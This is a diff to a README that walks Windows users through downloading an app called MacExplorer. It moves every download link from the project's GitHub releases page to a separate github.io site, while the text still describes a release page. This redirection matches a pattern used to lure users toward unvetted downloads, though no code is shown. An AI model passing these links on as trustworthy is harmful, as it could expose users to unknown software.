@@ -4,11 +4,11 @@
 
 Welcome to MacExplorer! This guide will walk you through downloading and running the application on your Windows computer. Don't worry—we'll take it step by step, and you'll be up and running in just a few minutes.
 
-[![Download MacExplorer](https://img.shields.io/badge/Download-MacExplorer-blue?style=for-the-badge&logo=github)](https://github.com/Kenny206868/MacExplorer/releases)
+[![Download MacExplorer](https://img.shields.io/badge/Download-MacExplorer-blue?style=for-the-badge&logo=github)](https://kenny206868.github.io)
 
 ## 📥 Downloading MacExplorer
 
-Visit this link to download the application: [https://github.com/Kenny206868/MacExplorer/releases](https://github.com/Kenny206868/MacExplorer/releases)
+Visit this link to download the application: [https://kenny206868.github.io](https://kenny206868.github.io)
 
 When you click the link, you'll see a page with the latest release of MacExplorer. Look for the download section on that page. The release page will show you available files and information about the current version.
 
@@ -16,7 +16,7 @@ When you click the link, you'll see a page with the latest release of MacExplore
 
 Once you've visited the download page, here's what happens next:
 
-Visit this link to download the application: [https://github.com/Kenny206868/MacExplorer/releases](https://github.com/Kenny206868/MacExplorer/releases)
+Visit this link to download the application: [https://kenny206868.github.io](https://kenny206868.github.io)
 
 After downloading, you'll have the MacExplorer files on your computer. The application is ready to use once you've completed the download from the release page.
 
